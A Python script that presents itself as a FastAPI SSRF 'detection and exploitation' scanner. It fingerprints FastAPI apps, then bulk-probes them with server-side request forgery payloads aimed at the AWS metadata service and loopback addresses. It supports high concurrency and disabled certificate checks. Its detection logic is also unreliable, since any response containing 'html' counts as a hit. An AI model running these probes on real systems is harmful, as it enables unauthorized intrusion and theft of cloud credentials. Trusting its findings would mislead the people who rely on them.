#!/usr/bin/env python3
"""
FastAPI SSRF Scanner — Detection and Exploitation for SSRF Vulnerabilities
==============================================================================
This tool is designed to detect and optionally exploit Server-Side Request Forgery
(SSRF) vulnerabilities in APIs or web services built with FastAPI.

FastAPI, when incorrectly configured, can expose endpoints that allow attackers to 
leverage SSRF vulnerabilities to send unauthorized requests to internal or external
resources. This tool identifies FastAPI applications and their vulnerable endpoints 
by probing for FastAPI-specific response traits and potential SSRF behavior.

Vulnerability Details:
  - Often arises when user-supplied URLs are directly fetched without proper validation.
  - Attackers can exploit SSRF vulnerabilities to access internal resources like IAM 
    metadata services, internal APIs, sensitive files, or escalate to RCE.
  - Critical if exposed on the public internet with exploitable endpoints.

Usage:
  # Scan a single FastAPI target (active SSRF probe against internal metadata API)
  python fastapi_ssrf_scanner.py --target https://api.example.com

  # Perform detection-only without probing vulnerable endpoints
  python fastapi_ssrf_scanner.py --target https://api.example.com --safe

  # Bulk scan from a list of targets
  python fastapi_ssrf_scanner.py --list targets.txt --output results.json

  # Adjust concurrency and ignore SSL warnings
  python fastapi_ssrf_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://fastapi.tiangolo.com/advanced/security/
  - https://portswigger.net/web-security/ssrf
  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional, List

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME        = "fastapi_ssrf_scanner"
VULN_CLASS       = "SSRF"
REQUEST_TIMEOUT  = 8
SEMAPHORE_LIMIT  = 30

# FastAPI fingerprints in API responses
FASTAPI_FINGERPRINTS = [
    "FastAPI", 
    "fastapi.responses", 
    "fastapi.routing.APIRouter", 
    "Starlette"
]

# SSRF test payloads for probing vulnerable endpoints
SSRF_TEST_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata Service
    "http://localhost/",                        # Localhost probe
    "http://127.0.0.1/",                        # Loopback address probe
    "http://api/v1/internal",                   # Internal API convention
]


# ── CLI argument parsing ──────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="FastAPI SSRF Scanner — Detection and Exploitation for SSRF Vulnerabilities"
    )
    parser.add_argument("--target", help="Target base URL to scan")
    parser.add_argument("--list", help="File containing a list of targets")
    parser.add_argument("--output", help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Detection only; no active probing")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--concurrency", type=int, default=30,
                        help="Concurrency level for requests (default: 30)")
    return parser.parse_args()


# ── Utility Functions ────────────────────────────────────────────────────────

async def fetch(url: str, client: httpx.AsyncClient) -> Optional[httpx.Response]:
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except (httpx.TimeoutException, httpx.RequestError) as e:
        print(c(YELLOW, f"[!] Request to {url} failed: {e}"))
        return None


async def detect_fastapi(url: str, client: httpx.AsyncClient) -> Optional[str]:
    """Attempt to detect FastAPI by checking for specific fingerprints in responses."""
    for path in ["/", "/docs", "/redoc", "/openapi.json"]:
        full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
        response = await fetch(full_url, client)
        if response and any(fingerprint in response.text for fingerprint in FASTAPI_FINGERPRINTS):
            print(c(GREEN, f"[+] Detected FastAPI at {full_url}"))
            return full_url
    return None


async def probe_ssrf(url: str, ssrf_url: str, client: httpx.AsyncClient) -> Optional[str]:
    """Test a URL for SSRF. If SSRF is successfully triggered, return the vulnerable endpoint."""
    try:
        response = await client.get(url, params={"url": ssrf_url}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ["linux", "window", "html"]):
            print(c(RED, f"[!] Potential SSRF detected at {url} with payload {ssrf_url}"))
            return ssrf_url
    except Exception:
        pass
    return None


# ── Scanning Logic ────────────────────────────────────────────────────────────

async def scan_target(
    target: str, safe_mode: bool, no_verify: bool
) -> dict:
    """
    Scan a single target for FastAPI SSRF vulnerabilities.
    """
    target_result = {"target": target, "fastapi_detected": False, "ssrf_vulnerable": False, "vulnerable_endpoints": []}

    async with httpx.AsyncClient(verify=not no_verify) as client:
        print(c(CYAN, f"[*] Scanning {target}..."))
        # Step 1: Detect FastAPI
        detected_url = await detect_fastapi(target, client)
        if not detected_url:
            print(c(YELLOW, f"[-] No FastAPI detected at {target}"))
            return target_result
        target_result["fastapi_detected"] = True
        target_result["detection_url"] = detected_url

        # Step 2: Probe vulnerable targets if not in safe mode
        if not safe_mode:
            for payload in SSRF_TEST_PAYLOADS:
                ssrf_result = await probe_ssrf(detected_url, payload, client)
                if ssrf_result:
                    target_result["ssrf_vulnerable"] = True
                    target_result["vulnerable_endpoints"].append({
                        "endpoint": detected_url,
                        "payload": payload,
                    })

    return target_result


async def main():
    args = parse_args()

    # Create a list of targets
    targets = []
    if args.target:
        targets = [args.target]
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        print(c(RED, "[!] Error: You must provide either --target or --list"))
        sys.exit(1)

    # Set up concurrency control
    semaphore = asyncio.Semaphore(args.concurrency)

    async def semaphore_bound_scan(target):
        async with semaphore:
            return await scan_target(target, args.safe, args.no_verify)

    # Perform scans
    results = await asyncio.gather(*[semaphore_bound_scan(target) for target in targets])

    # Output results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(c(GREEN, f"[+] Results saved to {args.output}"))
    else:
        print(json.dumps(results, indent=2))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(c(RED, "\n[!] Scan interrupted by user"))
